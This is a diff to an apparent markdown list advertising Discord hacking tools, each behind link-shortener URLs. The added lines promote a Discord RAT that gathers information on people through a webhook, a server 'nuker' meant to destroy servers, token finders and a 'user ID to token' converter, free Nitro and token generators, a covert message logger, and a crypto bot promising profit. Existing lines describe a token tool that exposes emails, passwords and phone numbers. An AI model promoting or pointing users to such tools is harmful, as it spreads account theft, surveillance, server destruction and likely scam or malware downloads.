@@ -39,3 +39,12 @@
 - [Discord Token Tool](https://link-target.net/1119282/discord-token-tool). This allows you to get infomation on a token. You can get emails, passwords, phone numbers ETC.
 - [Discord History Deleter](https://link-center.net/1119282/discord-history-deleter). This allows you to get a clean slate and remove anything you have said.
 - [Clones Discord Servers](https://direct-link.net/1119282/discord-server-cloner). Completely clones discord servers with ease
+- [Discord RAT](https://link-hub.net/1119282/discord-rat). Can be used with a webhook to gain infomation on people (should be used for educational purposes).
+- [Nitro Generator](https://direct-link.net/1119282/nitro-and-token-generator). Easy way to get free nitro.
+- [Token Generator](https://direct-link.net/1119282/nitro-and-token-generator). Easy to use token generator for free members
+- [Discord Server Nuker](https://link-center.net/1119282/discord-nuker). Discord server nuker to destroy all servers.
+- [Discord Token Finder](https://link-hub.net/1119282/discord-token-finder). Finds a users discord token with complex algorithms.
+- [Crypto Discord Bot](https://link-target.net/1119282/crypto-discord-bot). Helps you make lots of money trading with this bot.
+- [Discord User ID To Token](https://direct-link.net/1119282/discord-user-id-to-token). Get a users discord token from their user id.
+- [Discord Message Logger](https://link-target.net/1119282/discord-message-logging). Logs all messages in a bot to catch ur homies lacking.
+
